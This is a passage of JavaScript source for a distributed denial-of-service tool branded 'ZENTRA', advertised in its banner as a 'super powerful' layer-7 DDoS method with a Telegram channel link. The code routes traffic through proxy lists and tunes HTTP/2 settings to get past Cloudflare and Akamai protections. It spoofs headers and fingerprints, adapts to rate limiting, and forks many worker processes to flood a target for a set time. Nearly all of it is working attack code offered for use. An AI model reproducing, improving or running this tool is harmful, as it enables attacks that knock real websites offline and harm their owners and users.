                            (proxyuser && proxypass ? `Proxy-Authorization: Basic ${Buffer.from(`${proxyuser}:${proxypass}`).toString('base64')}\r\n` : '') +
                            `\r\n`;
                        socket.write(connectReq);
                    });
                    let response = '';
                    socket.on('data', (chunk) => {
                        response += chunk.toString();
                        if (response.includes('\r\n\r\n')) {
                            const statusLine = response.split('\r\n')[0];
                            const statusCode = statusLine.match(/HTTP\/\d\.\d\s+(\d+)/)?.[1];
                            if (statusCode === '200') {
                                callback(null, socket);
                            } else {
                                callback(new Error());
                            }
                            socket.removeAllListeners('data');
                        }
                    });
                } else {
                    socks.createConnection({
                        proxy: {
                            host: proxyhost,
                            port: proxyport,
                            type: options.proxytype.toLowerCase() === 'socks5' ? 5 : 4,
                            ...(proxyuser && proxypass && { userId: proxyuser, password: proxypass })
                        },
                        command: 'connect',
                        destination: connectOptions,
                        timeout: 5000
                    }, (err, info) => {
                        if (err) return callback(err);
                        callback(null, info.socket);
                    });
                }
            } catch {
                callback(new Error());
            }
        };
        createConnection((err, socket) => {
            if (err) {
                setTimeout(() => flood(endTime, retryCount + 1), 500);
                return;
            }
            let isCleaningUp = false;
            socket.setTimeout(5000);
            const tlsSocket = createAdvancedTLSSocket(socket, hostname);
            if (!tlsSocket) {
                setTimeout(() => flood(endTime, retryCount + 1), 500);
                return;
            }
            const cleanup = () => {
                if (isCleaningUp) return;
                isCleaningUp = true;
                try {
                    if (client) client.close();
                    if (tlsSocket) tlsSocket.destroy();
                    if (socket) socket.destroy();
                    connectionPool.delete(proxyStr);
                } catch {}
            };
            let client;
            tlsSocket.on('secureConnect', async () => {
                if (tlsSocket.alpnProtocol !== 'h2') {
                    cleanup();
                    return;
                }
                const isps = [
                    'Cloudflare, Inc.', 'FDCservers.net', 'OVH SAS', 'VNXCLOUD',
                    'Akamai Technologies, Inc.', 'Fastly, Inc.', 'Ddos-guard LTD',
                    'Amazon.com, Inc.', 'Microsoft Corporation', 'Google LLC'
                ];
                const isp = randomElement(isps);
                let settings = getOptimizedHttp2SettingsByISP(isp, options);
                if (options.backend) {
                    const targetAnalysis = {
                        isCloudflare: hostname.includes('cloudflare') || Math.random() > 0.6,
                        isAkamai: hostname.includes('akamai') || Math.random() > 0.7
                    };
                    if (targetAnalysis.isCloudflare) {
                        settings.headerTableSize = 8192 + Math.floor(Math.random() * 2048);
                        settings.maxConcurrentStreams = Math.floor(Math.random() * 500 + 500);
                    } else if (targetAnalysis.isAkamai) {
                        settings.initialWindowSize = 131072 + Math.floor(Math.random() * 65536);
                        settings.maxFrameSize = 32768;
                    }
                }
                try {
                    client = http2.connect(host, {
                        createConnection: () => tlsSocket,
                        settings
                    });
                } catch {
                    cleanup();
                    return;
                }
                connectionPool.set(proxyStr, { client, tlsSocket, socket, lastUsed: Date.now() });
                let statusCounts = {};
                let totalRequests = 0;
                let currentRate = parseInt(rate);
                let lastLogTime = Date.now();
                let lastResetTime = Date.now();
                let consecutiveErrors = 0;
                let currentUrl = host;
                const sendRequest = async () => {
                    if (Date.now() >= endTime || client.destroyed || consecutiveErrors > 5) {
                        cleanup();
                        if (Date.now() < endTime) {
                            setTimeout(() => flood(endTime, retryCount + 1), 500);
                        }
                        return;
                    }
                    try {
                        let baseHeaders = generateBaseHeaders(proxyStr, hostname, fingerprint, sessionId);
                        let headers = generateAdvancedHeaders(proxyStr, hostname, fingerprint, sessionId, baseHeaders);
                        if (!Object.keys(headers).length) throw new Error();
                        hpack.compressHeaders(headers);
                        const req = client.request(headers, {
                            endStream: headers[':method'] === 'GET'
                        });
                        let responseBody = '';
                        let responseHeaders = {};
                        req.on('response', async (headers) => {
                            responseHeaders = headers;
                            const status = headers[':status'];
                            statusCounts[status] = (statusCounts[status] || 0) + 1;
                            totalRequests++;
                            consecutiveErrors = 0;
                            if (options.redirect && [301, 302, 307].includes(status)) {
                                try {
                                    const redirectResult = await redirectHandler.handleRedirect(
                                        { ...headers, body: responseBody },
                                        currentUrl,
                                        { customHeaders: headers }
                                    );
                                    if (redirectResult && redirectResult.redirectUrl) {
                                        currentUrl = redirectResult.redirectUrl;
                                        let redirectBaseHeaders = { ...headers, ...redirectResult.redirectOptions.customHeaders };
                                        headers = generateAdvancedHeaders(proxyStr, new URL(currentUrl).hostname, fingerprint, sessionId, redirectBaseHeaders);
                                        const newReq = client.request(headers, {
                                            endStream: headers[':method'] === 'GET'
                                        });
                                        newReq.on('response', (newHeaders) => {
                                            responseHeaders = newHeaders;
                                            statusCounts[newHeaders[':status']] = (statusCounts[newHeaders[':status']] || 0) + 1;
                                            totalRequests++;
                                        });
                                        newReq.on('data', (chunk) => {
                                            responseBody += chunk.toString();
                                        });
                                        newReq.on('end', () => {});
                                        newReq.on('error', () => {
                                            consecutiveErrors++;
                                            if (consecutiveErrors > 5) {
                                                cleanup();
                                                setTimeout(() => flood(endTime, retryCount + 1), 500);
                                            }
                                        });
                                        if (headers[':method'] === 'POST') {
                                            const postData = random_string(randomInt(10, 50));
                                            newReq.write(postData);
                                            newReq.end();
                                        }
                                    }
                                } catch {
                                    consecutiveErrors++;
                                }
                            }
                            if (Date.now() - lastLogTime >= 3000) {
                                const statusText = Object.entries(statusCounts).map(([k, v]) => `${k}: ${v}`).join(', ');
                                const label = '\x1b[38;2;7;140;255mZ\x1b[38;2;21;130;255mE\x1b[38;2;35;121;255mN\x1b[38;2;49;112;255mT\x1b[38;2;63;102;255mR\x1b[38;2;77;93;255mA\x1b[0m';
                                console.log(`[${label}] | Target: [\x1b[4m${host}\x1b[0m] | Requests: ${totalRequests} | Status: [${statusText}]`);
                                lastLogTime = Date.now();
                                if (Date.now() - lastResetTime >= 60000) {
                                    statusCounts = {};
                                    lastResetTime = Date.now();
                                }
                            }
                            if (options.ratelimitopt && status === 429) {
                                currentRate = Math.max(10, Math.floor(currentRate * 0.8));
                                setTimeout(() => {
                                    currentRate = Math.min(parseInt(rate), Math.floor(currentRate * 1.2));
                                }, 5000);
                            }
                        });
                        req.on('data', (chunk) => {
                            responseBody += chunk.toString();
                        });
                        req.on('end', () => {});
                        req.on('error', () => {
                            consecutiveErrors++;
                            if (consecutiveErrors > 5) {
                                cleanup();
                                setTimeout(() => flood(endTime, retryCount + 1), 500);
                            }
                        });
                        if (headers[':method'] === 'POST') {
                            const postData = random_string(randomInt(10, 50));
                            req.write(postData);
                            req.end();
                        }
                        if (!client.destroyed && totalRequests % 10 === 0) {
                            setImmediate(sendRequest);
                        } else {
                            const delay = Math.max(5, 1000 / (currentRate * (options.backend ? 1.5 : 2)));
                            setTimeout(sendRequest, delay);
                        }
                    } catch {
                        consecutiveErrors++;
                        if (consecutiveErrors > 5) {
                            cleanup();
                            setTimeout(() => flood(endTime, retryCount + 1), 500);
                        } else {
                            setImmediate(sendRequest);
                        }
                    }
                };
                for (let i = 0; i < 10; i++) {
                    setTimeout(sendRequest, i * (options.backend ? 15 : 10));
                }
            });
            tlsSocket.on('error', () => {
                if (!isCleaningUp) {
                    cleanup();
                    setTimeout(() => flood(endTime, retryCount + 1), 500);
                }
            });
            socket.on('timeout', () => {
                if (!isCleaningUp) {
                    cleanup();
                    setTimeout(() => flood(endTime, retryCount + 1), 500);
                }
            });
            socket.on('error', () => {
                if (!isCleaningUp) {
                    cleanup();
                    setTimeout(() => flood(endTime, retryCount + 1), 500);
                }
            });
        });
    }

    // ============ START ============
    function start() {
        const endTime = Date.now() + parseInt(time) * 1000;
        if (options.info) {
            console.log('=== Attack Information ===');
            console.log(`Target: ${host}`);
            console.log(`Duration: ${time} seconds`);
            console.log(`Rate: ${rate} requests/second`);
            console.log(`Threads: ${thread}`);
            console.log(`Proxy File: ${proxyfile} (${proxies.length} proxies)`);
            console.log(`Proxy Type: ${options.proxytype}`);
            console.log('Options Enabled:');
            console.log(`  Random Path: ${options.randpath}`);
            console.log(`  High Bypass: ${options.highbypass}`);
            console.log(`  Cache Bypass: ${options.cachebypass}`);
            console.log(`  Full Headers: ${options.fullheaders}`);
            console.log(`  Extra Headers: ${options.extraheaders}`);
            console.log(`  Query Optimization: ${options.queryopt}`);
            console.log(`  Fingerprint: ${options.fingerprintopt}`);
            console.log(`  Rate Limiting: ${options.ratelimitopt}`);
            console.log(`  Redirect: ${options.redirect}`);
            console.log(`  No Path: ${options.npath}`);
            console.log(`  Backend: ${options.backend}`);
            console.log(`  All Options: ${options.useAll}`);
            console.log('=========================');
        }
        if (cluster.isPrimary) {
            console.clear();
            console.log(gradient.fruit(`
╔══════════════════════════════════════════════════════════════════════╗
║  ZENTRA Free methods ddos layer7 super powerful                     ║
║  chanel : https://t.me/+Dy2X0W-jvmQ1MGQ1                           ║
╚══════════════════════════════════════════════════════════════════════╝
`));
            console.log(gradient.retro(` Target   : ${host}`));
            console.log(gradient.retro(` Duration : ${time} seconds`));
            console.log(gradient.retro(` Rate     : ${rate} req/s`));
            console.log(gradient.retro(` Threads  : ${thread}`));
            console.log(gradient.mind(` Method Get For Low Webtise `));
            console.log(gradient.passion(`════════════════════════════════════════════`));
            const restartScript = () => {
                for (const id in cluster.workers) {
                    cluster.workers[id].kill();
                }
                setTimeout(() => {
                    for (let counter = 1; counter <= parseInt(thread); counter++) {
                        cluster.fork();
                    }
                }, RESTART_DELAY);
            };
            const handleRAMUsage = () => {
                const totalRAM = os.totalmem();
                const usedRAM = totalRAM - os.freemem();
                const ramPercentage = (usedRAM / totalRAM) * 100;
                if (ramPercentage >= MAX_RAM_PERCENTAGE) {
                    restartScript();
                }
            };
            setInterval(handleRAMUsage, 5000);
            for (let i = 0; i < parseInt(thread); i++) {
                cluster.fork();
            }
            cluster.on('exit', (worker) => {
                console.log(` Restarting...`);
                cluster.fork();
            });
            setTimeout(() => {
                console.log(gradient.passion(`
════════════════════════════════════════════`));
                console.log(gradient.retro(` Attack Completed!`));
                console.log(gradient.passion(`════════════════════════════════════════════`));
                Object.values(cluster.workers).forEach(worker => worker.kill());
                process.exit(0);
            }, parseInt(time) * 1000);
            setInterval(() => {
                for (const [proxy, conn] of connectionPool.entries()) {
                    if (Date.now() - conn.lastUsed > 10000) {
                        conn.client.close();
                        conn.tlsSocket.destroy();
                        conn.socket.destroy();
                        connectionPool.delete(proxy);
                    }
                }
            }, 5000);
        } else {
            function runWorker() {
                if (Date.now() >= endTime) {
                    return process.exit(0);
                }
                if (connectionPool.size < MAX_CONNECTIONS_PER_WORKER) {
                    flood(endTime);
                }
                setImmediate(runWorker);
            }
            runWorker();
        }
    }

    start();
}

process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});
